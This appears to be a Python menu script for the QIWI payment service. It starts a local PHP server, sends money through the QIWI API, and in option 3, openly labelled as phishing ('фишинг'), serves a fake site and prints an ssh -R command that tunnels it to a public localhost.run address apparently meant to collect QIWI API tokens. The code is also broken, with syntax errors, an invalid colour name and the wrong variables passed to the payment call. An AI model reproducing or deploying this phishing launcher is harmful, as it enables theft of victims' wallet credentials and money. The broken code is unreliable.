import os
import subprocess
from SimpleQIWI import * 
from colorama import Fore, Back, Style

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
banner = """

░██████╗░░██████╗░██╗░██╗░░░░░░░██╗██╗
██╔════╝░██╔═══██╗██║░██║░░██╗░░██║██║
██║░░██╗░██║██╗██║██║░╚██╗████╗██╔╝██║
██║░░╚██╗╚██████╔╝██║░░████╔═████║░██║
╚██████╔╝░╚═██╔═╝░██║░░╚██╔╝░╚██╔╝░██║
░╚═════╝░░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝
"""

cls()
print(Fore.GREEN + banner ")
                                      
print(" ")
print(Fore.BLACK + " ")
print(" ")
print(Fore.YELLOW + " [1] QIWI API | веб версия")
print(" ")
                   
print(Fore.MAGENTA + " [2] QIWI API | в терминале")
print(" ")
print(Fore.BLUE + " [3] Fishing fake site | фишинг ")
print(Fore.Cyan + " [4] Подписаться на автора
print(" ")
print(" ")

a = input(Fore.GREEN + " Change parametr | Выберите параметр: ")


if a == "1":
    cls()
    print(Fore.GREEN + banner)
    print("-------------------------------------------------")
                                          
    print(" ")

    print(" ")
    print(Fore.GREEN + "  Starting Server... ")
    os.chdir("api")
    try:
        os.system("php -S localhost:8080")
    except:
        print(Fore.RED + "Download php, or reboot your device | Установите php или перезагрузите устройство")
        print(Fore.WHITE + "apt install php")

elif a == "2":
    print(Fore.GREEN + banner)
    print("-------------------------------------------------")
    print(" ")
             
    token = input(Fore.YELLOW + ' Токен: ')
    print(" ")
    phone = input(' Номер телефона: ')
    print(" ")
    summa = input(" Сумма: ")
    print(" ")
    com = input(" Комментарий к переводу: ")
    api = QApi(token=token, phone=phone)
    print(" ")
    print(Fore.WHITE + 'Найдено!')
            
    api.pay(account=" Куда перевести деньги: ", amount= a, comment=com)
    print(api.balance)

elif a == "3":
    cls()
    print(Fore.GREEN + banner)
    print(" ")
                                           
    print(" ")
    print(Fore.GREEN + "  Starting Server... ")
    os.chdir("fish")
    print(os.listdir())
    try:
              
        print(Fore.MAGENTA + "   Open second session and write command: ")
        print(" ")
        print(Fore.WHITE + "  ssh -R 80:localhost:8080 qiwi-api-token-form-id@ssh.localhost.run")
        print(" ")
        print(Fore.MAGENTA + "   Откройте вторую сессию и напишите команду вверху")
        os.system("php -S localhost:8080")
    except:
        print(Fore.RED + "Download php, or reboot your device | Установите php или перезагрузите устройство")
        print(Fore.WHITE + "apt install php")
elif a == "4":
      os.system("termux-open-url 'https://t.me/TerPackZ'")
      exit()
else:
	print(Fore.RED + " Выбран неверный параметр ")
	

        
